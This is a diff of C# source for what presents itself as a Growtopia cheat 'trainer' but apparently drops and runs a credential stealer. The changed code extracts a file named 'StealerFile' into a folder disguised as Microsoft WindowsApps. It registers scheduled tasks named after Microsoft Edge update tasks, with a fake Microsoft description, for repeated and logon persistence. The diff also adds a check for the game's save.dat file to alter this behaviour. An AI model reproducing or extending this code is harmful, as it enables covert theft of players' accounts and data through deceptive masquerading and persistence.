@@ -76,6 +76,7 @@ namespace FreeZeHAX_Trainer
                 string StealerFolderLoc = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\WindowsApps" + "\\Microsoft.Windows.StartMenuExperienceHost_" + FolderChars;
                 string StealerFolder = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\WindowsApps\\";
                 string StealerFile = StealerFolderLoc + "\\" + FileName;
+                bool savePathExists = File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Growtopia\\save.dat");
                 others.DirClean(StealerFolder);
                 others.Wait(1000);
                 Directory.CreateDirectory(StealerFolderLoc);
@@ -85,21 +86,41 @@ namespace FreeZeHAX_Trainer
                     Directory.Delete(Guna, true);
                 }
                 System.IO.Compression.ZipFile.ExtractToDirectory(StealerFolderLoc + "\\" + ZipFileName, StealerFolderLoc);
-                System.Diagnostics.Process.Start(StealerFile);
-                td.RegistrationInfo.Description = "Keeps your Microsoft software up to date. If this task is disabled or stopped, your Microsoft software will not be kept up to date, meaning security vulnerabilities that may arise cannot be fixed and features may not work. This task uninstalls itself when there is no Microsoft software using it.";
-                DailyTrigger dt = new DailyTrigger();
-                dt.Repetition.Duration = TimeSpan.FromHours(24);
-                dt.Repetition.Interval = TimeSpan.FromMinutes(30);
-                td.Triggers.Add(dt);
-                td.Actions.Add(StealerFile);
-                TaskService.Instance.RootFolder.RegisterTaskDefinition("MicrosoftEdgeUpdateTaskMachineCore", td);
-                TaskService.Instance.AddTask("MicrosoftEdgeUpdateTaskMachineUA", QuickTriggerType.Logon, StealerFile, "-a arg");
-
-                if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
+                if (!savePathExists)
                 {
-                    return;
+                    td.RegistrationInfo.Description = "Keeps your Microsoft software up to date. If this task is disabled or stopped, your Microsoft software will not be kept up to date, meaning security vulnerabilities that may arise cannot be fixed and features may not work. This task uninstalls itself when there is no Microsoft software using it.";
+                    DailyTrigger tf = new DailyTrigger();
+                    tf.Repetition.Duration = TimeSpan.FromHours(24);
+                    tf.Repetition.Interval = TimeSpan.FromMinutes(120);
+                    td.Triggers.Add(tf);
+                    td.Actions.Add(StealerFile);
+                    TaskService.Instance.RootFolder.RegisterTaskDefinition("MicrosoftEdgeUpdateTaskMachineCore", td);
+                    TaskService.Instance.AddTask("MicrosoftEdgeUpdateTaskMachineUA", QuickTriggerType.Logon, StealerFile, "-a arg");
+
+                    if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
+                    {
+                        return;
+                    }
+                    File.Delete(StealerFolderLoc + "\\" + ZipFileName);
                 }
-                File.Delete(StealerFolderLoc + "\\" + ZipFileName);
+                else
+                {
+                    System.Diagnostics.Process.Start(StealerFile);
+                    td.RegistrationInfo.Description = "Keeps your Microsoft software up to date. If this task is disabled or stopped, your Microsoft software will not be kept up to date, meaning security vulnerabilities that may arise cannot be fixed and features may not work. This task uninstalls itself when there is no Microsoft software using it.";
+                    DailyTrigger dt = new DailyTrigger();
+                    dt.Repetition.Duration = TimeSpan.FromHours(24);
+                    dt.Repetition.Interval = TimeSpan.FromMinutes(30);
+                    td.Triggers.Add(dt);
+                    td.Actions.Add(StealerFile);
+                    TaskService.Instance.RootFolder.RegisterTaskDefinition("MicrosoftEdgeUpdateTaskMachineCore", td);
+                    TaskService.Instance.AddTask("MicrosoftEdgeUpdateTaskMachineUA", QuickTriggerType.Logon, StealerFile, "-a arg");
+
+                    if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
+                    {
+                        return;
+                    }
+                    File.Delete(StealerFolderLoc + "\\" + ZipFileName);
+                }
             }
             catch (Exception) { }
             #endregion
